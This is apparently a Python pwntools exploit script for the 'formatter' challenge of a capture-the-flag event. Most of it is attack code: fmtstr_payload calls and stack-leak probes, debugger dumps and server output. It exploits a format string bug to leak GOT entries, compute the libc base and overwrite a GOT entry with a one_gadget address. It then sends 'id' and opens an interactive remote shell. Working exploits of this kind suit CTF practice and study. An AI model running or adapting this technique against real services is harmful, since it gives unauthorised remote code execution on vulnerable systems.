from pwn import *
import time

host	= "pwn.pwnme.fr"
port	= 7009

# 29 31cookie

"""
	21 --> 401406
  401401:       e8 6a fd ff ff          call   401170 <calloc@plt>
  401406:       48 89 45 98             mov    QWORD PTR [rbp-0x68],rax
  40140a:       8b 05 00 2c 00 00       mov    eax,DWORD PTR [rip+0x2c00]        # 404010 <SIZE>
  401410:       48 63 d0                movsxd rdx,eax
  401413:       48 83 ea 01             sub    rdx,0x1
  401417:       48 89 55 a0             mov    QWORD PTR [rbp-0x60],rdx

34 0x4011b0
00000000004011b0 <_start>:
  4011b0:       f3 0f 1e fa             endbr64 
  4011b4:       31 ed                   xor    ebp,ebp
  4011b6:       49 89 d1                mov    r9,rdx
  4011b9:       5e                      pop    rsi
  4011ba:       48 89 e2                mov    rdx,rsp
  4011bd:       48 83 e4 f0             and    rsp,0xfffffffffffffff0


"""

elf = ELF("./formatter")
libc=ELF("./libc-2.27.so")
print(elf.symbols)

"""
#  --> main
writes = {0x404018:   elf.symbols["main"],}

for i in range(40):
	pl = fmtstr_payload(6, writes, numbwritten=i)
	print(pl)
	io = remote(host,port)
	io.sendline(pl)
	time.sleep(0.1)
	io.sendline(pl)
	time.sleep(0.1)
	print(io.recvall().decode())

"""

"""
0000| 0x7fffffffde30 --> 0xa7024000a ('\n')
0008| 0x7fffffffde38 --> 0xffffffffffffffb8 
0016| 0x7fffffffde40 --> 0x0 
0024| 0x7fffffffde48 --> 0x0 
0032| 0x7fffffffde50 --> 0x0 
0040| 0x7fffffffde58 --> 0x7ffff7e5c364 (<__GI___libc_malloc+116>:      mov    r8,rax)
0048| 0x7fffffffde60 --> 0x7fffffffdeb0 --> 0x7fffffffe028 --> 0x7fffffffe371 ("/home/octaline/Bureau/pwnme/formatter/formatter")
0056| 0x7fffffffde68 --> 0x7fffffffdf30 --> 0x0 
0064| 0x7fffffffde70 --> 0x0 
0072| 0x7fffffffde78 --> 0x7ffff7e5d32a (<__libc_calloc+538>:   mov    rdx,r12)
0080| 0x7fffffffde80 --> 0x8000 
0088| 0x7fffffffde88 --> 0x7fffffffdeb0 --> 0x7fffffffe028 --> 0x7fffffffe371 ("/home/octaline/Bureau/pwnme/formatter/formatter")
0096| 0x7fffffffde90 --> 0x7fffffffdf30 --> 0x0 
0104| 0x7fffffffde98 --> 0x4011b0 (<_start>:    endbr64)
0112| 0x7fffffffdea0 --> 0x0 
21 / 0120| 0x7fffffffdea8 --> 0x401406 (<main+64>:   mov    QWORD PTR [rbp-0x68],rax)
0128| 0x7fffffffdeb0 --> 0x7fffffffe028 --> 0x7fffffffe371 ("/home/octaline/Bureau/pwnme/formatter/formatter")
0136| 0x7fffffffdeb8 --> 0x100000000 
24 / 0144| 0x7fffffffdec0 --> 0x200000000 
0152| 0x7fffffffdec8 --> 0x4052a0 --> 0x716cb599bd226a4e 
26 / 0160| 0x7fffffffded0 --> 0x7f 
0168| 0x7fffffffded8 --> 0x7fffffffde30 --> 0xa7024000a ('\n')
0176| 0x7fffffffdee0 --> 0x7fffffffde30 --> 0xa7024000a ('\n')
29 /0184| 0x7fffffffdee8 --> 0x716cb599bd226a4e 
0192| 0x7fffffffdef0 --> 0x0 
"""
"""
20
[+] Opening connection to pwn.pwnme.fr on port 7009: Done
[+] Receiving all data: Done (112B)
[*] Closed connection to pwn.pwnme.fr port 7009
b'[+] W3lc0m3 t0 th3 b3s7 f0rm4tt3r [+]\n|\n|- Enter your string -> |=> (nil)\n|- Enter your string -> |=> (nil)\nbye\n'

21
[+] Opening connection to pwn.pwnme.fr on port 7009: Done
[+] Receiving all data: Done (118B)
[*] Closed connection to pwn.pwnme.fr port 7009
b'[+] W3lc0m3 t0 th3 b3s7 f0rm4tt3r [+]\n|\n|- Enter your string -> |=> 0x401406\n|- Enter your string -> |=> 0x401406\nbye\n'

22
[+] Opening connection to pwn.pwnme.fr on port 7009: Done
[+] Receiving all data: Done (130B)
[*] Closed connection to pwn.pwnme.fr port 7009
b'[+] W3lc0m3 t0 th3 b3s7 f0rm4tt3r [+]\n|\n|- Enter your string -> |=> 0x7ffd1b8aa658\n|- Enter your string -> |=> 0x7ffd1b8aa658\nbye\n'

23
[+] Opening connection to pwn.pwnme.fr on port 7009: Done
[+] Receiving all data: Done (124B)
[*] Closed connection to pwn.pwnme.fr port 7009
b'[+] W3lc0m3 t0 th3 b3s7 f0rm4tt3r [+]\n|\n|- Enter your string -> |=> 0x100000000\n|- Enter your string -> |=> 0x100000000\nbye\n'

24
[+] Opening connection to pwn.pwnme.fr on port 7009: Done
[+] Receiving all data: Done (118B)
[*] Closed connection to pwn.pwnme.fr port 7009
b'[+] W3lc0m3 t0 th3 b3s7 f0rm4tt3r [+]\n|\n|- Enter your string -> |=> (nil)\n|- Enter your string -> |=> 0x100000000\nbye\n'
"""
# canary a 31
"""
for i in range(256):
	print(i)
	io = remote(host,port)
	pl = "%"+str(i)+"$p"
	io.sendline(pl.encode())
	time.sleep(0.1)
	pl = "%"+str(i)+"$s"
	io.sendline(pl.encode())
	time.sleep(0.1)
	print(io.recvall())
	input()
"""

# %16$p -16 --> payload
# %16p +2 --> counter
"""
for i in range(256):
	io = remote(host,port)
	pl = "%16$p"
	io.sendline(pl.encode())
	io.recvuntil(b"> 0x")
	stack = io.recvline().strip()
	print(stack)
	addr= p64(int(b"0x"+stack,16)+8*i)
	print(i,addr.hex())
	pl = b"%7$s    "+addr
	io.sendline(pl)
	time.sleep(0.1)
	print(io.recvall())
	input()
"""

# >>> infinite loop
context.clear(arch = 'amd64')
for i in range(1):

	# Connection
	io = remote(host,port)
	#io = process("./formatter")
	"""	
	# stack localization
	pl = "%16$p"
	io.sendline(pl.encode())
	io.recvuntil(b"> 0x")
	stack = io.recvline().strip()
	print(stack)
	_addr = int(b"0x"+stack,16)+8*2
	addr= p64(_addr)
	print(i,addr.hex(),_addr)
	
	# infinite write -> 16 writes
	writes = {_addr: 0xfffffffd00000000 } #0xffffffff00000000
	pl = fmtstr_payload(6, writes, numbwritten=i*0)
	io.sendline(pl)
	#io.recvuntil(b"|=>")
	time.sleep(0.1)
	"""
	
	# get canary
	"""
	pl = "%31$p"
	io.sendline(pl.encode())
	io.recvuntil(b"> 0x")
	canary = io.recvline().strip()
	print(canary)
	_addr = int(b"0x"+canary,16)
	addr= p64(_addr)
	print(i,addr.hex(),_addr)
	"""
	
	"""	
	# Prog Redirection -> loop by redirection
	writes = {0x404018:  elf.symbols["main"]}
	pl = fmtstr_payload(6, writes, numbwritten=i*0)
	io.sendline(pl)
	time.sleep(0.1)
	"""
	
	# Leak
	pl =b"%7$s-put"+p64(elf.symbols["got.puts"])
	pl =b"%7$s-put"+p64(elf.symbols["got.fopen"])
	io.sendline(pl)
	leak=io.recvuntil(b"-put").split(b" ")[-1].split(b"-")[0][::-1].hex()
	leak=int('0x'+leak,16)
	#leak= io.recvline()
	print(hex(leak))
	offset=leak - libc.symbols["puts"]
	offset=leak - libc.symbols["fopen"]
	print(hex(offset))
	time.sleep(0.1)
	
	# try onegadget
	where=offset+0x4f2a5*0+0x4f302*0+0x10a2fc*1+0xe54f7*0+0xe534f*0
	writes = {0x404018:  where}
	pl = fmtstr_payload(6, writes, numbwritten=i*0)
	io.sendline(pl)
	time.sleep(0.1)
	
	# check
	io.sendline(b"id")
	io.sendline(b"id")
	
	# user
	print(io.interactive())
	#print(io.recvall(timeout=2))
	io.clean()
	time.sleep(0.5)
	

